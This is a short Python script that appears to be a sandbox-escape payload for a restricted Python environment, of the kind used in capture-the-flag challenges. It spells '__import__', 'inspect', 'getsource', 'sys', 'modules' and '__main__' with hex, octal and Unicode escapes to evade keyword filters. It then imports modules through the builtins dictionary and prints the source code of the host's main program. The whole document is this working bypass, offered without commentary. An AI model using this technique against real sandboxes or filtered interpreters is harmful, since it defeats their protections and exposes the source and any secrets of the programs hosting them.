builtins = vars(__builtins__)

import_func = builtins["\x5f_\u0069\155p\u006fr\u0074\137_"]
print(f"import_func: {import_func}")

inspect_module = import_func("\151\u006esp\x65\U00000063t")
print(f"inspect_module: {inspect_module}")

vars_func = builtins["v\x61\U00000072\x73"]
print(f"vars_func: {vars_func}")

inspect_dict = vars_func(inspect_module)["\147\x65\164\x73\U0000006fu\U00000072\u0063e"]
print(f"inspect_dict: {inspect_dict}")

sys_module = import_func("\U00000073\u0079s")
print(f"sys_module: {sys_module}")

print_func = builtins["\x70\162\u0069nt"]
print(f"print_func: {print_func}")

main_dict = inspect_dict(vars_func(sys_module)["\x6d\U0000006f\144\x75\u006c\U00000065\163"]["_\U0000005f\u006d\141i\u006e\U0000005f_"])
print(f"main_dict: {main_dict}")

